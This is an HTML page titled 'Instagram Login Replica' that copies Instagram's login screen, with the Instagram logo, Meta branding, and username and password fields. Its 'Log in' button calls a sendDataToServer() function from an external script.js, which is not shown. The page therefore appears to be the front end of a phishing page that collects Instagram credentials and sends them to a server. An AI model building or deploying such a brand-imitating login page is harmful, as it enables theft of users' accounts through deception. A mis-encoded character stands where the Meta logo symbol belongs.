<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login Replica</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      margin: 0;
      height: 100vh;
      background-color: #121d26;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }

    .container {
      width: 320px;
      text-align: center;
    }

    .language {
      font-size: 14px;
      color: #b0b8bf;
      margin-bottom: 20px;
    }

    .logo {
      width: 70px;
      margin: 10px auto 30px;
    }

    .input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border-radius: 12px;
      border: 1px solid #2a3a45;
      background-color: #1c2a33;
      color: #fff;
      font-size: 14px;
    }

    .input::placeholder {
      color: #8e9aa3;
    }

    .login-btn {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border-radius: 30px;
      border: none;
      background-color: #1877f2;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    .forgot {
      margin-top: 20px;
      font-size: 14px;
      color: #ffffff;
      cursor: pointer;
    }

    .create-btn {
      width: 100%;
      padding: 14px;
      margin-top: 40px;
      border-radius: 30px;
      border: 1px solid #1877f2;
      background: transparent;
      color: #1877f2;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .meta {
      margin-top: 30px;
      font-size: 14px;
      color: #b0b8bf;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .meta span {
      font-size: 18px;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="language">English (UK)</div>

    <!-- Instagram logo -->
    <img 
      class="logo"
      src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
      alt="Instagram Logo"
    />

    <input 
      type="text"
      class="input"
      id="username"
      placeholder="Username, email address or mobile number"
    />

    <input 
      type="password"
      class="input"
      id="password"
      placeholder="Password"
    />
    

    <button class="login-btn" onclick="sendDataToServer()" >Log in</button>
  

    <div class="forgot">Forgotten password?</div>

    <button class="create-btn">Create new account</button>

    <div class="meta">
      <span>âˆž</span> Meta
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
